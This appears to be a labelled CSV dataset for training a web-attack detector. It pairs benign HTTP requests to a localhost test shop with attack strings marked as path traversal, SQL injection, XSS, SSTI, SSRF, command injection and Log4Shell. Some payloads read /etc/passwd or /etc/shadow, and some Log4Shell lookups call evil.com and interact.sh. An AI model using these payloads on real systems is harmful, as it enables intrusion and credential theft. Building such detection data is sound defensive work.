payload,label,source
"GET http://localhost:8080/tienda1/publico/pagar.jsp?modo=insertar&precio=9751&B1=Confirmar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=96DEB904D6665758B689F48BA573F3D8 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/carrito.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=E156A8920CFA33102F0F709E0C943478 Connection: close",normal,csic_2010
//127.0.0.1/C$/Windows/system32/drivers/etc/hosts.,path_traversal,seclists
search=$(ps aux),command_injection,augmented
%%c0%6e%c0%6e%25c0%25af%%c0%6e%c0%6e%25c0%25af%%c0%6e%c0%6e%25c0%25af%%c0%6e%c0%6e%25c0%25af%%c0%6e%c0%6e%25c0%25afetc%25c0%25afpasswd,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=BD3629AD5CA1958A21F7AE0E7442AC01 Connection: close",normal,csic_2010
${jndi:iiop://interact.sh:53/${sys:user.name}},log4shell,augmented
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=massinga&password=reSPALdar&nombre=Peregrino&apellidos=O%F1ate+Leguisamo&email=armida%40automovilesalhambra.pl&dni=65278169Y&direccion=C%2F+Canal%2C+25%2C+9%3FF&ciudad=Azkoitia&cp=38911&provincia=Salamanca&ntc=561993959286828&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=92F36C9C10AD0A7546F53A55AC92C796 Connection: close",sqli,csic_2010
/etc/ipmasq/rules/I15lospoof.def,path_traversal,seclists
"GET http://localhost:8080/tienda1/publico/entrar.jsp?errorMsg=Credenciales+incorrectas HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=F4E219AA75FC498A56DEF1B0F21AE6DE Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=371B7569FAF1FB7BD722A348F00DFBF5 Connection: close",normal,csic_2010
modo=registro&login=hews&password=01r1f9co&nombre=Natalio&apellidos=Sams%F3+Agea&email=piesa-diestel%40hacia.tz&dni=22011041H&direccion=C%2F+Dique+De+Abrigo+96+5%3FH&ciudad=Novallas&cp=47649&provincia=Navarra&ntc=3618056132500846&B1=Registrar,normal,csic_2010
"POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=27BB369794262F3051AAFBB6B6AA7105 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"request[""__class__""]",ssti,payloads_all_the_things
"POST http://localhost:8080/tienda1/publico/entrar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=89361D57F11006C12B6199287D7F9774 Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
C:\Program Files\IceWarp\html\webmail\client\objects\obj_barmenu.xml,path_traversal,seclists
%%c0%6e%c0%6e0x5c%%c0%6e%c0%6e0x5cwindows0x5csystem320x5cdrivers0x5cetc0x5chosts,path_traversal,payloads_all_the_things
modo=registro&login=jeri&password=8n6s17D741a49e&nombre=Eutimio&apellidos=Zamudio&email=bannen%40masqueclases.ch&dni=98531799Y&direccion=Geologo+Palacios%2C+134%2C+13%3FB&ciudad=Puigverd+de+Lleida&cpA=09560&provincia=Teruel&ntc=3173800761137477&B1=Registrar,sqli,csic_2010
<INPUT TYPE=”IMAGE” SRC=”javascript:alert(‘XSS’);”>,xss,seclists
../../../../../../../../../../../../../usr/local/lib/php.ini%00,path_traversal,seclists
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=k%3Far%2Bie&pwd=40c7c0o&remember=off&B1=Entrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=4EEBC5312BCC033B2955043CE7027C70 Connection: close",sqli,csic_2010
..%01%c0%af..%01%c0%af..%01%c0%afetc%c0%afissue,path_traversal,payloads_all_the_things
${j${::-n}di:iiop://evil.com:53/a},log4shell,augmented
destination=dict://127.0.0.1/proc/self/environ,ssrf,augmented
/etc/defoma/hints/cmap-adobe-cns1.ext.hints,path_traversal,seclists
SELECT 1 FROM dual WHERE 1=(SELECT 1 FROM dual),sqli,payloads_all_the_things
../../../etc/pure-ftpd/pure-ftpd.conf%00,path_traversal,seclists
%0aecho%20ARNNHW$((53%2B8))$(echo%20ARNNHW)ARNNHW%5C%5C,command_injection,seclists
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=dugas&password=e00Tr6o&nombre=Jabes&apellidos=Grandia+Zarzosa&email=husky_hurlic%40ropadegolf.sn&dni=19807221N&direccion=C%2F+Dionisio+Acebal+41+&ciudad=Valverde&cp=05146&provincia=Huesca&ntc=2752106671698345&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=BF78F8AEEFE79652ACAEC70F16D68E6F Connection: close",normal,csic_2010
"<IMG SRC=""javascript:alert(4392)""",xss,payloads_all_the_things
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=46EAA392DCAD8AEB51AF0BA9FF6F501B Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
<#assign num='freemarker.template.utility.Execute'?new()>${num('cat /etc/shadow')},ssti,augmented
..../%e0%80%afetc%e0%80%afpasswd,path_traversal,payloads_all_the_things
"GET http://localhost:8080/tienda1/global/creditos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=219E06FF5B1FBCD9BA6178F6EA94F8BF Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/miembros/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=32A86B5EC119FDE23340C8FC351F5ADB Connection: close",normal,csic_2010
%f8%80%80%80%ae%f8%80%80%80%ae%e0%80%af%f8%80%80%80%ae%f8%80%80%80%ae%e0%80%af%f8%80%80%80%ae%f8%80%80%80%ae%e0%80%afetc%e0%80%afpasswd,path_traversal,payloads_all_the_things
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=7F16C1DD77940174BBCFB2F893896CF1 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=D5E18D5EED184867D177247835DA252C Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=schouwen&password=6%E9rce8o&nombre=Yoselin&apellidos=Yeladaky+Janeiro&email=munch_velazquez%40hiperzaragoza.tk&dni=75013152D&direccion=Cami+De+Almoster%2C+109%2C+&ciudad=Palacios+de+Riopisuerga&cp=34485&provincia=Palencia&ntc=1134273490923216&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=30C9BC758654FFB67A902283E5F23F23 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/vaciar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=1D9A5B9B2E9101F171E3FEF68C8DCBAC Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=yu-wei&password=MaScadurA&nombre=Lih%E9n&apellidos=Ce%F1al&email=mostel%40hipernavarra.mc&dni=49437237W&direccion=Paseo+Escuelas+Pias%2C+119%2C+&ciudad=Busto%2C+El&cp=16779&provincia=Toledo&ntc=6995607131571243%3C%21--%23include+file%3D%22archivo_secreto%22+--%3E&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=07B0BF24A6C32012C5F9A302A7F34C60 Connection: close",sqli,csic_2010
"POST http://localhost:8080/tienda1/miembros/editar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=8C0B87578733CDD450E267025CADD97A Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"POST http://localhost:8080/tienda1/publico/registro.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=64E2197BE5328A9178D4EC9354F0F28B Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/anadir.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=A38B3DF38FD27B8AEA51A3AF07676854 Content-Type: application/x-www-form-urlencoded Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/global/titulo.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=FC1C40A358B33C9C33D48871F26135A8 Connection: close",normal,csic_2010
ldap://127.1/etc/passwd,ssrf,augmented
"GET http://localhost:8080/tienda1/index.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=63B44D1152BCD415ED897CA7EE438D57 Connection: close",normal,csic_2010
../../../var/log/apache2/error.log%00,path_traversal,seclists
"GET http://localhost:8080/tienda1/miembros/editar.jsp?modo=registro&login=dirk&password=8d0n23&nombre=%3CSCRIPT%3Ealert%28%22Paros%22%29%3B%3C%2FSCRIPT%3E&apellidos=Caparr%E0s+Bujan&email=bunnag%40djbroadcast.me&dni=05409515F&direccion=Calle+Incas%2C+159%2C+5%3FA&ciudad=Busturia&cp=29410&provincia=Le%F3n&ntc=9280136087068381&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=BA579F1D69CE539664815C68EADE3C7E Connection: close",xss,csic_2010
<%=s*30%>,ssti,augmented
"GET http://localhost:8080/tienda1/publico/productos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=9C8DCB110E57287EA2A1D66ABDED6968 Connection: close",normal,csic_2010
modo=insertar&precio=2946&B1=Confirmar,normal,csic_2010
"<plaintext onmouseup=""alert(1)"">test</plaintext>",xss,seclists
"GET http://localhost:8080/tienda1/imagenes/2.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=631A46C155B838A112F687B4AE05FD3E Connection: close",normal,csic_2010
modo=registro&login=szaplonc&password=aglutinaci%F3n&nombre=Natanel&apellidos=Muziotti+Sebastian&email=hama.beckel%40sayuela.ir&dni=73427092Y&direccion=Calle+Clavel%2C+80+&ciudad=Ezcabarte&cp=08458&provincia=Huelva&ntc=5042511275721363&B1=Registrar,sqli,csic_2010
C:\Program Files\WindowsPowerShell\Modules\powershellget\1.0.0.1\psget.format.ps1xml,path_traversal,seclists
modo=insertar&precio=6857&B1=Confirmar,sqli,csic_2010
"GET http://localhost:8080/tienda1/imagenes/3.gif HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=15ED715AC68D603A7D75733126A3AC33 Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/registro.jsp?modo=registro&login=vladica&password=V10e47rIAN8&nombre=Lienhard&apellidos=Gandoy+Gobern&email=glazerlvezic_goff%40apicultor.lr&dni=02927660J&direccion=Indalecio+Prieto%2C+1%2C+13%3FB&ciudad=R%E1banos&cp=18129&provincia=Cuenca&ntc=1765300748031043&B1=Registrar HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=5777B9CE0BC1E871558A685F31120330 Connection: close",normal,csic_2010
"POST http://localhost:8080/tienda1/publico/pagar.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=B018B097A2F51B8094E73B3CD8248AEC Content-Type: application/x-www-form-urlencoded Connection: close",normal,csic_2010
"GET http://localhost:8080/tienda1/publico/autenticar.jsp?modo=entrar&login=heinonen&pwd=S%2BOso&remember=on&B1=Entrarany%250ASet-cookie%253A%2BTamper%253D1041264011025374727 HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=0CADCFA8B799959C1E4021312C37B373 Connection: close",sqli,csic_2010
"GET http://localhost:8080/tienda1/miembros/fotos.jsp HTTP/1.1 User-Agent: Mozilla/5.0 (compatible; Konqueror/3.5; Linux) KHTML/3.5.8 (like Gecko) Pragma: no-cache Cache-control: no-cache Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 Accept-Encoding: x-gzip, x-deflate, gzip, deflate Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5 Accept-Language: en Host: localhost:8080 Cookie: JSESSIONID=562771769815A840D3FFA5F7DDFFD478 Connection: close",normal,csic_2010
